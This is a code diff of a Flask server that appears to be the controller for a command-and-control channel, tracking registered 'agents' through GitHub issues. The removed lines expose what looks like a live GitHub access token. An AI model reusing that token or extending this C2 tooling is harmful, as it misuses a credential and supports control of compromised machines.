@@ -3,9 +3,9 @@ import requests
 
 app = Flask(__name__)
 
-# GitHub settings
-GITHUB_TOKEN = "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"
-GITHUB_REPO = "CaptShiva007/C2-Channel"
+#GitHub config
+GITHUB_TOKEN = ""
+GITHUB_REPO = ""
 HEADERS = {
     "Authorization": f"token {GITHUB_TOKEN}",
     "Accept": "application/vnd.github.v3+json"
@@ -37,10 +37,13 @@ def get_agent_details(agent_id):
     response = requests.get(f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}", headers=HEADERS)
     if response.status_code == 200:
         issue = response.json()
+        title_parts = issue["title"].split(" | ")
+        hostname = title_parts[0].replace("Agent Registered: ", "").strip()
+        
         return jsonify({
-            "hostname": issue["title"].split(" | ")[0],
+            "hostname": hostname, 
             "id": issue["number"],
-            "os": "Windows"  # Assuming Windows based on agent.go implementation
+            "os": "Windows"
         })
     return jsonify({"error": "Agent not found"}), 404
 
